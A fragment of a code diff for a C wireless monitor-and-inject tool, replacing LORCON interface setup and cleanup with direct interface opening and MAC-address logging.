+    logger(INFO, "Initialized %s interface for monitor. HW: %02x:%02x:%02x:%02x:%02x:%02x", wi_get_ifname(ctx->wi_mon), ctx->mon_mac[0], ctx->mon_mac[1], ctx->mon_mac[2], ctx->mon_mac[3], ctx->mon_mac[4], ctx->mon_mac[5]);
+ 
+    if(!strcmp(ctx->if_inj_name, ctx->if_mon_name)) {
+        logger(INFO, "Monitor and inject interfaces are the same, so inject == monitor");
+        ctx->wi_inj = ctx->wi_mon;
+    } else {
+        if(!(ctx->wi_inj = wi_open(ctx->if_inj_name))) {
+            logger(FATAL, "Fail to initialize inject interface: %s", ctx->if_inj_name);
+            return -1;
+        }
+        wi_get_mac(ctx->wi_inj, ctx->inj_mac);
+        logger(INFO, "Initialized %s interface for inject. HW: %02x:%02x:%02x:%02x:%02x:%02x", wi_get_ifname(ctx->wi_inj), ctx->inj_mac[0], ctx->inj_mac[1], ctx->inj_mac[2], ctx->inj_mac[3], ctx->inj_mac[4], ctx->inj_mac[5]);
     }
-
-    ctx->interface_inj_vap = strdup(lorcon_get_vap(ctx->context_inj));
-    ctx->interface_mon_vap = strdup(lorcon_get_vap(ctx->context_mon));
 
     // Set the channels we'll be monitor and inject on
     for (ch_c = 0; ch_c <= sizeof(ctx->channels); ch_c++) {
@@ -963,9 +1066,6 @@ int main(int argc, char *argv[]) {
     }
 
     logger(INFO, "We are done");
-    // The following is all of the standard cleanup stuff
-    clear_lorcon_interface(ctx->context_inj);
-    clear_lorcon_interface(ctx->context_mon);
 
     return 0;
 }
